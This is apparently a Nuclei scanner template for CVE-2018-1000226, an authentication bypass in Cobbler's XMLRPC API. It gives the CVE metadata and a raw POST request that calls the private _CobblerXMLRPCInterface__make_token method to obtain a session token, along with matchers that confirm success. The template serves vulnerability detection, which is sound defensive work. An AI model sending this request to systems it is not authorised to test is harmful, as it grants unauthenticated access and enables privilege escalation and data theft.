id: CVE-2018-1000226
info:
  author: c-sh0
  classification:
    cve-id: CVE-2018-1000226
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-732
  description: Cobbler versions 2.6.11+, but code inspection suggests at least 2.0.0+
    and possibly even older versions, may be vulnerable to an authentication bypass
    vulnerability in XMLRPC API (/cobbler_api) that can result in privilege escalation,
    data manipulation or exfiltration, and LDAP credential harvesting. This attack
    appear to be exploitable via "network connectivity". Taking advantage of improper
    validation of security tokens in API endpoints. Please note this is a different
    issue than CVE-2018-10931.
  name: Cobbler - Authentication Bypass
  reference:
  - https://github.com/cobbler/cobbler/issues/1916
  - https://movermeyer.com/2018-08-02-privilege-escalation-exploits-in-cobblers-api/
  - https://nvd.nist.gov/vuln/detail/CVE-2018-1000226
  severity: critical
  tags: cve,cve2018,cobbler,auth-bypass
requests:
- matchers:
  - status:
    - 200
    type: status
  - part: header
    type: word
    words:
    - 'Content-Type: text/xml'
  - part: body
    type: word
    words:
    - <methodResponse>
  - dsl:
    - '!contains(tolower(body), ''<name>faultCode</name>'')'
    type: dsl
  - part: body
    regex:
    - (.*[a-zA-Z0-9].+==)</string></value>
    type: regex
  matchers-condition: and
  raw:
  - "POST {{BaseURL}}/cobbler_api HTTP/1.1\nHost: {{Hostname}}\nContent-Type: text/xml\n\
    \n<?xml version='1.0'?>\n<methodCall>\n  <methodName>_CobblerXMLRPCInterface__make_token</methodName>\n\
    \  <params>\n    <param>\n      <value>\n        <string>cobbler</string>\n  \
    \    </value>\n    </param>\n  </params>\n</methodCall>\n"
